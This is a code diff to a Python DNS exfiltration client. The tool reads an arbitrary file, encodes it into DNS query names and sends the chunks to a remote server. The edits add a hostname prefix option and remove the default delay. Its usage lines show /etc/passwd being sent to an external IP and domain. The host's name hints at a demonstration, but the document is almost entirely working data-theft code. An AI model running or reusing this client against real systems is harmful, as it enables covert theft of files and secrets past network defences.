@@ -4,9 +4,11 @@ DNS-based file exfiltration client (pure dnslib)
 
 Usage:
 • With explicit IP:
-    python3 dns_exfil_client.py /etc/passwd 52.56.139.78 dnsdemo.andrewrea.co.uk
+    python3 client.py /etc/passwd 52.56.139.78 dnsdemo.andrewrea.co.uk
 • Auto-resolve from domain:
-    python3 dns_exfil_client.py /etc/passwd dnsdemo.andrewrea.co.uk
+    python3 client.py /etc/passwd dnsdemo.andrewrea.co.uk
+• With prefix:
+    python3 client.py /etc/passwd dnsdemo.andrewrea.co.uk --prefix server01
 """
 
 import argparse, base64, os, socket, time, traceback
@@ -19,14 +21,15 @@ MAX_QNAME = 253  # DNS max query name length
 # ────────────────────────── utilities
 def to_labels(data: bytes, domain: str) -> List[str]:
     b64 = base64.urlsafe_b64encode(data).decode().rstrip("=")
-    max_len = MAX_QNAME - len(domain) - 10  # 10 for ".NN." + room for label joins
     labels = []
     i = 0
     while i < len(b64):
         chunk = b64[i:i+MAX_LABEL]
         labels.append(chunk)
         i += MAX_LABEL
-        if sum(len(l) + 1 for l in labels) + len(domain) + 4 >= MAX_QNAME:
+        # check if we're about to exceed max QNAME length
+        qname_len = sum(len(l) + 1 for l in labels) + len(domain) + 1  # +1 for dot before domain
+        if qname_len >= MAX_QNAME - 10:  # safety margin
             break
     return labels
 
@@ -77,18 +80,22 @@ def send(qname: str, server_ip: str) -> None:
         traceback.print_exc()
 
 # ────────────────────────── main logic
-def exfil(file_path: str, srv_or_dom: str, dom: Optional[str], delay: float) -> None:
+def exfil(file_path: str, srv_or_dom: str, dom: Optional[str], delay: float, prefix: Optional[str]) -> None:
     if dom is None:
-        domain = srv_or_dom
-        server_ip = resolve_ip(domain)
+        base_domain = srv_or_dom
+        server_ip = resolve_ip(base_domain)
         if not server_ip:
             print("[!] Abort: cannot resolve domain")
             return
     else:
         server_ip = srv_or_dom
-        domain = dom
+        base_domain = dom
 
+    # Construct the domain used in queries
+    full_domain = f"{prefix}.{base_domain}" if prefix else base_domain
     print(f"[✓] Resolved target → {server_ip}")
+    print(f"[✓] Using domain → {full_domain}")
+
     if not os.path.isfile(file_path):
         print(f"[!] File not found: {file_path}")
         return
@@ -97,17 +104,17 @@ def exfil(file_path: str, srv_or_dom: str, dom: Optional[str], delay: float) -> 
 
     # 1️⃣ path announcement
     path_token = file_path.strip("/").replace("/", "_")
-    send(f"path.{path_token}.{domain}", server_ip)
+    send(f"path.{path_token}.{full_domain}", server_ip)
     time.sleep(delay)
 
     # 2️⃣ chunked transfer
     index = 0
     offset = 0
     while offset < len(data):
-        chunk_size = 48  # raw data chunk (approx, actual split by labels)
+        chunk_size = 48  # safe chunk size
         chunk = data[offset:offset+chunk_size]
-        labels = to_labels(chunk, domain)
-        qname = ".".join(labels + [str(index), domain])
+        labels = to_labels(chunk, full_domain)
+        qname = ".".join(labels + [str(index), full_domain])
         print(f"[+] chunk {index}")
         send(qname, server_ip)
         offset += chunk_size
@@ -115,7 +122,7 @@ def exfil(file_path: str, srv_or_dom: str, dom: Optional[str], delay: float) -> 
         time.sleep(delay)
 
     # 3️⃣ eof
-    send(f"eof.{domain}", server_ip)
+    send(f"eof.{full_domain}", server_ip)
     print(f"[✓] Sent {index} chunks → {server_ip}")
 
 # ────────────────────────── CLI entry
@@ -124,7 +131,9 @@ if __name__ == "__main__":
     ap.add_argument("file")
     ap.add_argument("server_or_domain")
     ap.add_argument("domain", nargs="?", help="base domain (omit to auto-resolve)")
-    ap.add_argument("--delay", type=float, default=0.1)
+    ap.add_argument("--delay", type=float, default=0.0)
+    ap.add_argument("--prefix", type=str, default="", help="Optional prefix (e.g., hostname or env)")
+
     args = ap.parse_args()
-    exfil(args.file, args.server_or_domain, args.domain, args.delay)
+    exfil(args.file, args.server_or_domain, args.domain, args.delay, args.prefix)
 
